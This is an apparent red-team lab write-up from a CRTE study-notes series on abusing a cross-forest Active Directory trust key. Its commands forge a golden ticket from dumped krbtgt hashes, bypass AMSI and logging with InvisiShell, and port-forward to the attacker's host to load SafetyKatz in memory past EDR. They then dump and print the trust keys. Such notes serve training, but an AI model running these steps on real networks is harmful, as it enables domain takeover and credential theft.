@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTE Part 29 - Cross Forest Attacks - Trust Key Abuse to Access Explicitly Shared Resources | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+    }
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+    }
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    .goad-content ul, .goad-content ol {
+      margin: 20px 0;
+      padding-left: 30px;
+    }
+    .goad-content li {
+      color: var(--light-gray);
+      margin-bottom: 10px;
+      font-size: 20px;
+      line-height: 1.8;
+    }
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    .goad-content blockquote {
+      border-left: 4px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray-70);
+    }
+    .goad-content hr {
+      border: none;
+      border-top: 1px solid var(--jet);
+      margin: 40px 0;
+    }
+    .part-navigation {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 50px;
+      padding-top: 30px;
+      border-top: 1px solid var(--jet);
+    }
+    .part-navigation a {
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .part-navigation a:hover {
+      text-decoration: underline;
+    }
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      padding: 5px 0;
+      transition: color 0.25s ease;
+    }
+    .goad-sidebar-list a:hover {
+      color: var(--orange-yellow-crayola);
+    }
+    .back-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
+        <ul class="goad-sidebar-list">
+<li><a href="part-01-introduction.html">Part 1: Introduction</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li>
+<li><a href="part-03-privilege-escalation.html">Part 3: Privilege Escalation</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting attack</a></li>
+<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Privilege Escalation - Targeted Ker...</a></li>
+<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Privilege Escalation - LAPS (Local ...</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Dumping LSASS Credentials</a></li>
+<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: LSASS Attack With MDE Bypass</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Pass The Certificates Attack</a></li>
+<li><a href="part-11-privilege-escalation-unconstrained-delegation.html">Part 11: Privilege Escalation - Unconstraine...</a></li>
+<li><a href="part-12-privilege-escalation-constrained-delegation.html">Part 12: Privilege Escalation - Constrained ...</a></li>
+<li><a href="part-13-privilege-escalation-rbcdresource-based-constraine.html">Part 13: Privilege Escalation - RBCD(Resourc...</a></li>
+<li><a href="part-14-domain-persistence-golden-ticket-attack.html">Part 14: Domain Persistence - Golden Ticket ...</a></li>
+<li><a href="part-15-domain-persistence-silver-ticket-attack.html">Part 15: Domain Persistence - Silver Ticket ...</a></li>
+<li><a href="part-16-domain-persistence-diamond-ticket-attack.html">Part 16: Domain Persistence - Diamond Ticket...</a></li>
+<li><a href="part-17-domain-persistence-skeleton-key-attack.html">Part 17: Domain Persistence - Skeleton Key A...</a></li>
+<li><a href="part-18-domain-persistence-sapphire-ticket-attack.html">Part 18: Domain Persistence - Sapphire Ticke...</a></li>
+<li><a href="part-19-domain-persistence-adminsdholder-attack.html">Part 19: Domain Persistence - AdminSDHolder ...</a></li>
+<li><a href="part-20-cross-domain-attacks-active-directory-certificate.html">Part 20: Cross Domain Attacks - Active Direc...</a></li>
+<li><a href="part-21-shadow-credentials-abusing-user-object.html">Part 21: Shadow Credentials - Abusing User O...</a></li>
+<li><a href="part-22-cross-domain-attacks-unconstrained-delegation-to-e.html">Part 22: Cross Domain Attacks - Unconstraine...</a></li>
+<li><a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html">Part 23: Cross Domain Attacks - Attacking Az...</a></li>
+<li><a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 24: Cross Domain attacks - Child To For...</a></li>
+<li><a href="part-25-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 25: Cross Domain attacks - Child To For...</a></li>
+<li><a href="part-26-cross-forest-attacks-kerberoast-attack.html">Part 26: Cross Forest Attacks - Kerberoast A...</a></li>
+<li><a href="part-27-cross-forest-attacks-constrained-delegation-with-p.html">Part 27: Cross Forest Attacks - Constrained ...</a></li>
+<li><a href="part-28-cross-forest-attacks-unconstrained-delegation.html">Part 28: Cross Forest Attacks - Unconstraine...</a></li>
+<li><a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html" style="color: var(--orange-yellow-crayola);">Part 29: Cross Forest Attacks - Trust Key Ab...</a></li>
+<li><a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Part 30: Cross Forest Attacks - Injecting SI...</a></li>
+<li><a href="part-31-trust-abuse-mssql-servers-database-links.html">Part 31: Trust Abuse - MSSQL Servers - Datab...</a></li>
+<li><a href="part-32-cross-forest-attacks-foreign-security-principals-a.html">Part 32: Cross Forest Attacks - Foreign Secu...</a></li>
+<li><a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html">Part 33: Cross Forest Attacks - Abusing PAM(...</a></li>
+<li><a href="part-34-cross-forest-attacks-trusting-to-trusted-trust-key.html">Part 34: Cross Forest Attacks - Trusting to ...</a></li>
+<li><a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Part 35: Cross Forest Attacks - Abusing Trus...</a></li>
+        </ul>
+        <div class="separator"></div>
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <div class="goad-content">
+<h1>CRTE - Certified Red Team Expert</h1>
+
+<h2>Cross Forest Attacks - Trust Key Abuse to Access Explicitly Shared Resources</h2>
+
+When working in multi-forest Active Directory environments, understanding the attack paths available through cross-forest trusts is essential. One technique we must focus on is Trust Key Abuse to Access Explicitly Shared Resources. This research aims to break down this method and explain the key concepts behind it, so we can later apply it in practice during our lab work.
+<h3>What is a Forest Trust Key?</h3>
+
+When two forests establish a trust relationship, each side of the trust generates a password (Trust Key) that is shared between the two forests. This key is used to sign and validate cross-forest Kerberos tickets.
+If we compromise Domain Admin in our forest (Forest A), we can extract the Trust Key for the forest trust with Forest B. With this key, we can forge tickets that represent any user from Forest A when accessing resources in Forest B.
+<h3>Why Does the Trust Key Matter?</h3>
+
+The Trust Key is like a secret password between the two forests. It allows our forest to vouch for users when they request access to resources in the trusted forest.
+If we have the Trust Key, we can forge inter-realm Kerberos tickets (also called Trust Tickets) that make us appear as any user from Forest A when accessing Forest B.
+This does not give us automatic admin access in Forest B, but it allows us to access whatever resources are explicitly shared with users from Forest A.
+<h3>Trust Key Abuse to Access Explicitly Shared Resources</h3>
+
+This attack focuses on leveraging the Trust Key to access resources in Forest B that have been explicitly shared with Forest A.
+<h3>Steps to Perform the Attack:</h3>
+
+<ol>
+<li>Compromise Domain Admin in Forest A (eu.local).</li>
+<li>Extract the Trust Key for the trust between Forest A and Forest B (euvendor.local).</li>
+<li>Forge an inter-realm TGT (Trust Ticket) for any user in Forest A.</li>
+<li>Access resources in Forest B that are explicitly shared with Forest A.</li>
+</ol>
+<h3>Why This Works:</h3>
+
+<ul>
+<li>The forged Trust Ticket is signed with the valid Trust Key, so Forest B accepts it as legitimate.</li>
+<li>We impersonate a user from Forest A to access resources that are explicitly shared with our forest.</li>
+</ul>
+<h3>Limitation:</h3>
+
+<ul>
+<li>We only get access to resources that are explicitly shared with Forest A.</li>
+<li>If no resources are shared with Forest A, this technique won’t achieve anything.</li>
+</ul>
+<h3>Checking for Explicit Resource Sharing</h3>
+
+Once we obtain the Trust Key, our success depends entirely on whether Forest B has shared anything with Forest A.
+Some common examples of explicit resource sharing across forests:
+<ul>
+<li>Shared folders (SMB Shares) → e.g., a share open to "Domain Users" from Forest A.</li>
+<li>Group memberships → Forest B may add a group from Forest A to an ACL in Forest B.</li>
+<li>Permissions on printers, databases, or specific servers may allow users from Forest A.</li>
+</ul>
+We won't always know what is shared upfront, so we may need to explore systems in Forest B after forging the ticket.
+<h3>Trust Attributes to Watch</h3>
+
+When enumerating forest trusts, the following properties give us context on whether Trust Key Abuse is possible:
+<ul>
+<li>TrustType: Uplevel (Forest Trust) → Indicates it is a modern forest trust, which supports Kerberos authentication across forests.</li>
+<li>SelectiveAuthentication: True/False → If True, users from Forest A need explicit permissions to authenticate to Forest B.</li>
+<li>TrustAttributes: Common values are 8 (TREAT_AS_EXTERNAL), 72 (FOREST_TRANSITIVE + TREAT_AS_EXTERNAL).</li>
+</ul>
+While these properties don’t block Trust Key Abuse, they tell us what kind of trust we are dealing with and whether authentication flow might be restricted.
+<h3>Key Difference from SID History Injection</h3>
+
+<p>The core difference between Trust Key Abuse and SID History Injection is what we gain:
+<ul>
+<li>Trust Key Abuse → We become a user from our forest, but only get what is explicitly shared with our forest.</li>
+<li>SID History Injection → We become a privileged group member in the trusted forest and get access based on that group’s permissions.</li>
+</ul>
+With Trust Key Abuse, nothing is shared? We get nothing.
+With SID History Injection, if we inject a powerful group, we move freely in the trusted forest.</p>
+
+<p>When we compromise Domain Admin in a forest, we should immediately enumerate the trusts:
+<ul>
+<li>Extract the Trust Key to check for shared resources (Trust Key Abuse).</li>
+<li>Enumerate privileged groups with RID >= 1000 for SID History Injection.</li>
+</ul>
+Both attacks are valuable, but Trust Key Abuse is often the lower-hanging fruit. SID History Injection is more powerful but requires us to find a suitable group.
+Understanding both paths allows us to pick the right one based on the environment.</p>
+
+<p>Well we are assuming from this point that we have compromised the domain eu.local and now we do have Domain Admin under this domain.
+Now, While we enumerate this compromised domain, we also found out that, this domain has another Cross-Forest Trust with another domain named euvendor.local.
+We can abuse the Trust Key between these 2 forests (eu.local <----> euvendor.local) to access the euvendor.local forest.</p>
+
+Let’s start by extracting the Trust Key between Cross Forests. We should access the eu-dc$ which is the eu.local Domain controller and we can do it in several ways, since we already compromised that domain and we do have the KRBTGT key. We can create a Golden ticket and this way we can access the EU-DC$ domain controller or we can simply use the EU-DC$ Administrator’s cred and access the server.  
+<blockquote>Bare in mind that Diamond Ticket does not work in Cross-Forest Trusts, Only in Cross-Domain Trust, and because we are currently attacking from eu.techcorp.local domain, we are not able to forge a Diamond Ticket in this scenario.</blockquote>
+
+<h2>Forging a Golden Ticket to Access eu.local’s Domain controller (dc-eu.local)</h2>
+
+EU.LOCAL KRBTGT BELOW:
+User: krbtgt
+NTLM: 83ac1bab3e98ce6ed70c9d5841341538
+AES256: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d
+Let’s start by encoding our Rubeus.exe argument (golden) using ArgSplit.bat file and do the copy/paste into the session were we will be executing Rubeus.exe.
+<img src="./images/screenshot_357.png" alt="">
+
+Let’s now use Loader.exe to execute Rubeus.exe in the memory and forge the inter-realm Golden ticket and open a new session as  eu.local domain Administrator user.
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d  /show /ptt
+<img src="./images/screenshot_358.png" alt="">
+
+<h2>Uploading files into EU-DC$ machine</h2>
+
+<p>We will be uploading some files to carry on our enumeration from eu.local domain Controller. Let’s start by uploading InvisiShell.
+InvisiShell is a tool designed to bypass security controls in PowerShell, allowing for the stealthy execution of scripts by circumventing enhanced logging mechanisms and detection by security software.
+Here’s a detailed explanation of how InvisiShell works:
+<ul>
+<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI).</li>
+</ul>
+These are security features that Microsoft implemented to monitor and log PowerShell activity.
+<ul>
+<li>Hooking .NET Assemblies: InvisiShell achieves its bypass by hooking into the .NET assemblies System.Management.Automation.dll and System.Core.dll.</li>
+<li>Methods of Use: InvisiShell can be launched in two ways, depending on the user's privileges:</li>
+<li>Incapacitating Security Features: By hooking into these .NET assemblies, InvisiShell disables system-wide transcription, AMSI, and script block logging for the current PowerShell session.</li>
+<li>Avoiding Detection: When using InvisiShell, the tool hooks to System.Management.Automation.dll and System.Core.dll, which allows it to avoid system-wide transcription, script block logging, and AMSI.</li>
+<li>Integration with Other Tools: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts.</li>
+<li>Clean-up Process: To complete the clean-up, users must type exit in the new PowerShell session created by InvisiShell.</li>
+<li>Modified Version: The class uses a slightly modified version of InvisiShell.</li>
+<li>Location of Tools: All the tools, including InvisiShell, used in the lab environment are located in the C:\AD directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded.</li>
+<li>InvisiShell and Binaries: It is noted that binaries like Rubeus.exe may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt.</li>
+<li>Example Usage: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine.</li>
+</ul>
+In summary, InvisiShell is essential for maintaining stealth in the lab environment by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software.</p>
+
+It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine.
+If we are just a simple low level privileged user, then we should run RunWithRegistetyNonAdmin.bat.
+If we are a high level privileged user like Administrator for example, then we should run RunWithPathAsAdmin.bat.
+echo D | XCOPY C:\AD\Tools\InviShell \\EU-DC.eu.local\C$\Users\Public /E /H /C /I /Y
+<img src="./images/screenshot_359.png" alt="">
+
+Let’s upload our .Net loader to the EU-DC$, we will be using this loader to run Rubeus.exe in the memory, avoiding MDI Detection.
+We won’t be mapping any driver x as usual because mapping drivers do no work with Cross-Forest Trust, so we can copy the file with the following way.
+echo F | XCOPY C:\AD\Tools\Loader.exe \\eu-dc.eu.local\C$\Users\Public\Loader.exe /y
+<img src="./images/screenshot_360.png" alt="">
+
+We should Also upload ADModule for our enumeration with ADModule.
+echo D | XCOPY C:\AD\Tools\ADModule-master \\EU-DC.eu.local\C$\Users\Public /E /H /C /I /Y
+<img src="./images/screenshot_361.png" alt="">
+
+<h3>Breaking Down the Command:</h3>
+
+<ul>
+<li>XCOPY → The command for copying files and directories.</li>
+<li>C:\AD\Tools\ADModule-master → The source folder you want to copy.</li>
+<li>\\EU-DC.eu.local\C$\Users\Public → The destination folder.</li>
+<li>/E → Copies all subdirectories, including empty ones.</li>
+<li>/H → Copies hidden and system files.</li>
+<li>/C → Continues copying even if errors occur.</li>
+<li>/I → Assumes the destination is a directory (avoids prompts).</li>
+<li>/Y → Suppresses overwrite confirmation prompts.</li>
+</ul>
+
+Last but not least we will be uploading PowerView module as well. 
+echo F | XCOPY C:\AD\Tools\PowerView.ps1 \\EU-DC.eu.local\C$\Users\Public  /Y
+<img src="./images/screenshot_362.png" alt="">
+
+Now that we have uploaded all the files that we will need inside the eu.local DC, let’s start by running InvisiShell to try to bypass PowerShell defense mecanisms like, System-wide transcription, Script Block Logging, AMSI, .
+.\RunWithRegistryNonAdmin.bat
+<img src="./images/screenshot_363.png" alt="">
+
+<p>Now that we were able to execute InvisiShell and we could bypass PowerShell defense mecanisms, we can carry on with our Trusts enumeration that eu.local domain contains.</p>
+
+<h2>Enumerating Trust Forests with AD Module</h2>
+
+We need to be aware that ADModule is always enabled on Windows Server, so we do not need to import ADModule on a Windows server, only in workstations.
+We can also map or enumerate all the Trusts we do have from the current domain we are part of (eu.local).
+Please, be aware that, because we are using winrs to remote access the EU-DC$, Import-Module will no work with .ps1 files, in this case we will be using dot source solution.
+We can do our enumeration on Trusts in eu.local domain.
+Get-ADTrust -Filter <em>
+<img src="./images/screenshot_364.png" alt="">
+
+<ul>
+<li>Direction: Shows the direction of the trust. It can be Inbound, Outbound, or Bidirectional (in this case, Bidirectional).</li>
+<li>DisallowTransitivity: Indicates whether transitive trust is disabled. True means transitivity is blocked, False means transitive trust is allowed.</li>
+<li>DistinguishedName: The LDAP path to the trusted domain object within AD.</li>
+<li>ForestTransitive: Specifies if the trust is forest-wide transitive. True means it allows authentication across the entire forest.</li>
+<li>IntraForest: Indicates whether the trust is within the same forest. True if it is, False if it’s cross-forest.</li>
+<li>IsTreeParent: Specifies if the trusted domain is the parent in a domain tree structure. Typically False in cross-forest trusts.</li>
+<li>IsTreeRoot: Indicates if the trusted domain is a root domain in a tree. Usually False unless it’s a tree-root trust.</li>
+<li>Name: The DNS name of the trusted domain ( euvendor.local).</li>
+<li>ObjectClass: The object type, typically trustedDomain for trust objects.</li>
+<li>ObjectGUID: The unique identifier (GUID) of the trust object in AD.</li>
+<li>SelectiveAuthentication: True if selective authentication is enabled, meaning only specific users are allowed to authenticate across the trust.</li>
+<li>SIDFilteringForestAware: Indicates if SID filtering is enabled with forest awareness. True means SID filtering is enforced to protect against SID history attacks.</li>
+<li>SIDFilteringQuarantined: Shows if SID filtering is in quarantine mode. True means extra restrictions are applied.</li>
+<li>Source: The source domain (your current domain).</li>
+<li>Target: The target trusted domain (euvendor.local).</li>
+<li>TGTDelegation: True if the trust allows TGT delegation (Kerberos delegation across the trust).</li>
+<li>TrustAttributes: A numeric value representing specific trust settings (bitmask).</li>
+<li>TrustedPolicy: Policy details for the trusted domain (often empty unless custom policies are applied).</li>
+<li>TrustingPolicy: Policy details for your domain’s side of the trust (often empty unless custom policies are applied).</li>
+<li>TrustType: Describes the type of trust. Uplevel means it’s a trust with another Active Directory domain.</li>
+<li>UplevelOnly: True if the trust is only for Active Directory domains (not NT4 or legacy systems).</li>
+<li>UsesAESKeys: True if the trust supports AES encryption for Kerberos.</li>
+<li>UsesRC4Encryption: True if the trust supports RC4 encryption for Kerberos.</li>
+</ul>
+
+<p>This means we potentially have a path to pivot into those environments if we escalate privileges locally. Trusts like these often open doors for cross-domain attacks, we might be able to move laterally into us.techcorp.local (which we already compromised) or euvendor.local, depending on how the trusts are configured.</p>
+
+<h2>Enumerating Trusts with PowerView</h2>
+
+It is also possible to achieve the same enumeration above by using PowerView module, so let’s Import PowerView into our target. Once again, using Import-Module won’t work fine here since we are using winrs to remotelly access the eu.local domain controller. Let’s use Dot Sourcing to achieve this task.
+. .\PowerView.ps1
+Get-DomainTrust -Verbose
+<img src="./images/screenshot_365.png" alt="">
+
+<p>As we can see above, PowerView output seems to be more friendly in my option and it is self-explanatory.
+<ol>
+<li>SourceName – This is the domain we’re currently enumerating from (in this case, eu.local).</li>
+<li>TargetName – This is the domain that our domain trusts (e.g., us.techcorp.local or euvendor.local).</li>
+<li>TrustType – Specifies the type of trust:</li>
+<li>TrustAttributes – Flags describing trust behavior:</li>
+<li>TrustDirection – Describes the flow of trust:</li>
+<li>WhenCreated – Timestamp for when the trust was first created.</li>
+<li>WhenChanged – Timestamp for when the trust was last modified.</li>
+</ol>
+This output gives us key insights into our potential pivoting paths, whether SID filtering blocks abuse, and whether we might leverage forest transitivity for wider access.</p>
+
+<h2>Enumerating SMB Shares from Forest Trusts with PowerView</h2>
+
+We should alway enumerate the shares we are able to access to, in this case, it is always a good approach to enumerate if we do have Shares between our Trust Forest Domains. Now that we do have information of the Forest Trust we do have, let’s start by enumerating our new target Domain Controlle and we will do this using PowerView module.
+Enumerating Domain Controllers.
+Get-DomainController -Domain euvendor.local -Verbose
+<img src="./images/screenshot_366.png" alt="">
+
+We can see that euvendor.local domain controller is euvendor-dc.euvendor.local.
+Enumerating SMB Shares
+Invoke-ShareFinder -ComputerName euvendor-dc.euvendor.local -Verbose
+<img src="./images/screenshot_367.png" alt="">
+
+The PowerView Invoke-ShareFinder output shows shared resources on euvendor-dc.euvendor.local.
+Here’s what matters for us:
+<ul>
+<li>Interesting Explicit Shares:</li>
+<li>Standard DC Shares:</li>
+<li>Admin-Only Shares:</li>
+</ul>
+
+<h2>Portforwarding to bypass EDR</h2>
+
+What If we simply  download and execute Rubeus in memory now using our Loader.exe on the target machine?
+We could simply run Rubeus calling it straight from our attacking IP, but we would easily be caught by Defender or any sort of defense mechanism in place on our network.
+<h3>Let’s highlights the importance of my statement above.</h3>
+
+<p>Evading detection by security tools when performing actions such as credential dumping with tools like SafetyKatz can be a trigger to compromise all our Red Team operation and let me tell you why.
+<ul>
+<li>Direct Execution is Easily Detected: Running tools like Rubeus directly from an attacker's IP address makes it easy for security tools to detect the activity. Security mechanisms, such as Windows Defender and Microsoft Defender for Endpoint (MDE), are designed to identify known malicious tools, their signatures, and their behaviors.</li>
+<li>Network Traffic Monitoring: When Rubeus is executed from an external IP, it generates network traffic that can be monitored and flagged by security tools.</li>
+<li>LSASS Process Access is a Red Flag: Tools like SafetyKatz attempt to access the LSASS process to extract credentials from memory. This is a highly suspicious activity that will easily be detected and is a major indicator of a malicious attack.</li>
+<li>Bypassing Detection Mechanisms: To avoid detection, attackers need to implement various bypass techniques, including:</li>
+</ul>
+In summary, running Rubeus directly from an attacking IP is highly likely to be detected by most modern security tools. Therefore, attackers use advanced techniques like obfuscation, memory loading, process injection, and port forwarding to evade detection. The course material emphasizes these techniques in order to learn about these types of attacks and to improve red team Opsec.</p>
+
+To avoid being caught by any defensive mechanism, we can  simply create a PortForwarding on the target machine then call Rubeus using it’s localhost IP.
+Let’s remotelly access the us-web server and configure the portforwarding.
+winrs -r:eu-dc.eu.local cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.100.163
+<img src="./images/screenshot_368.png" alt="">
+
+netsh interface portproxy add v4tov4:
+<ul>
+<li>netsh interface portproxy: This is the part of the netsh utility that deals with port forwarding. It allows forwarding TCP traffic from one IP/port combination to another.</li>
+<li>add: Specifies that you're adding a new forwarding rule.</li>
+<li>v4tov4: Indicates that both the listening and connecting addresses use IPv4.</li>
+</ul>
+<h3>2. listenport=8080:</h3>
+
+<ul>
+<li>The port on the local machine (target machine) where the service will "listen" for incoming connections.</li>
+<li>In this case, the machine will listen on port 8080.</li>
+</ul>
+<h3>3. listenaddress=127.0.0.1:</h3>
+
+<ul>
+<li>The IP address on the local machine where the service will listen for connections.</li>
+<li>0.0.0.0 means it will listen on all network interfaces available on the machine (e.g., public, private, or loopback IPs).</li>
+</ul>
+<h3>4. connectport=80:</h3>
+
+<ul>
+<li>The port on the remote machine (Out Attacking Machine) to which traffic will be forwarded.</li>
+<li>In this case, port 80 (commonly used for HTTP).</li>
+</ul>
+<h3>5. connectaddress=192.168.100.163:</h3>
+
+<ul>
+<li>The IP address of the remote machine (Our Attacking Machine).</li>
+</ul>
+This port forwarding setup redirects traffic received on port 8080 from our compromised machine to port 80 on our attacking macchine (192.168.100.163),  which acts as a bridge.
+
+We can check this portforwarding with the following command:
+netsh interface portproxy show all
+<img src="./images/screenshot_369.png" alt="">
+
+<h2>Hosting SafetyKatz</h2>
+
+We should be hosting our SafetyKatz in our attacking host. This will be requested by our Target EU-DC$.
+<img src="./images/screenshot_370.png" alt="">
+
+<h3>Disabling Defender</h3>
+
+Before we carry on with our target host, we need to disable our firewall on our side. This way we can host the file on our machine with no issues, without having the firewall complaining.
+<img src="./images/screenshot_371.png" alt="">
+
+Now let’s first start by encoding our Safetykatz argument (lsadump::trust) using ArgSplit.bat  file and copy/paste the encoded argument into US-DC host where we will be running SafetyKatz.
+ArgSplit.bat
+<img src="./images/screenshot_372.png" alt="">
+
+We should now be able to execute SafetyKatz on the DC and request for the Trust Key for eu.local to euvendor.local.
+C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
+<img src="./images/screenshot_373.png" alt="">
+
+<pre><code class="language-bash">EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)
+Domain: EUVENDOR.LOCAL (EUVENDOR / S-1-5-21-4066061358-3942393892-617142613)
+ [  In ] EU.LOCAL -&gt; EUVENDOR.LOCAL
+    </em> 2/11/2025 9:03:15 PM - CLEAR   - f5 7e 9c d0 ff d1 ce 8b 19 fc aa 7b 29 d6 ec 32 03 02 96 f2 7c 18 8b 40 87 fc fd 85 ab f3 b0 41 f1 2c 21 04 8b 92 87 46 7c c1 47 6d d9 6d 7e d0 89 f6 d5 ee 9c 21 e4 6f 69 c4 89 2b 61 40 29 80 9d 40 e4 8c b9 e8 04 64 b4 12 5e b8 e1 d4 b1 25 8f f2 ca 09 f9 18 fe 32 53 d6 c9 93 2a d5 fa 7f a5 60 66 96 fa 77 01 7a 14 ef 50 fe 2f ca c2 a2 36 72 59 51 f7 b6 4e 76 47 ef 63 a0 ec 45 d6 24 6c f7 bd d5 c9 d0 c6 9f 6e c6 c9 55 4f 0a 26 d8 ef e4 06 2f 80 43 fb 52 72 c0 aa 40 a7 c1 ee 93 e8 66 a3 9c 60 ed 3a 7d 37 4e f4 6e 10 cc 14 71 35 85 01 07 70 4a 6f a0 22 57 65 41 7a 72 86 75 22 59 7e f6 6c 7a 0b 5a ac a4 30 19 7b 77 e0 ed 97 1e 46 c8 03 d1 40 64 05 82 20 19 4e 8d c2 1a ba 87 66 11 71 b5 bb 9a d8 94 62 92 6e e6 f5 36
+        <em> aes256_hmac       c197d2f364de43df95ff8ef720a1d3e2453c1aaf938085dfaa8b26b9dfcb507a
+        </em> aes128_hmac       aae3770ef8a650ef873d2991b18a5f1e
+        * rc4_hmac_nt       1de227d91293ec91b29980a5d9203241
+</code></pre>
+
+<h2>Forging the Ticket Inter-Real Silver Ticket</h2>
+
+With this Trust Key we can now forge our Inter-realm Golden ticket,
+In the first step, we are generating a Silver Ticket using the AES256 trust key. This ensures better stealth, as AES256 keys are less likely to trigger security alerts compared to RC4. We are crafting a Kerberos service ticket for LDAP under the eu.local domain, impersonating the Administrator account. Additionally, we are adding the eu.local SID (S-1-5-21-3657428294-2017276338-1274645009) to the ticket. By including /opsec, we reduce potential detection by security tools.
+Back to our attacking machine, we should be able to forge this ticket. We should encode the Rubeus argument(silver) with ArgSplit.bat and do the copy/paste into our session were Rubeus will be executed.
+ArgSplit.bat
+<img src="./images/screenshot_374.png" alt="">
+
+Using Rubeus will be using silver flag for that.
